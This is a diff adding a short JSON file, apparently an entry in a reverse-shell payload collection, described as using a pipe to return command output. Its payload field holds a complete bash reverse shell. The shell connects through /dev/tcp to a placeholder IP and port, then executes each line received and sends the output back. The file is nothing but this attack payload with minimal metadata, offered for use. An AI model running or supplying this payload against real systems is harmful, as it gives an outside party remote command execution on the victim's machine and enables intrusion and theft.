@@ -1,0 +1,10 @@
+{
+  "data": {
+    "information": {
+      "description": "users the pipe `|` to pipe command output back to user",
+      "type": "reverse",
+      "exec": "bash"
+    },
+    "payload": "exec 5<>/dev/tcp/[IP]/[PORT] && cat <&5 | while read line; do $line 2>&5 >&5; done"
+  }
+}
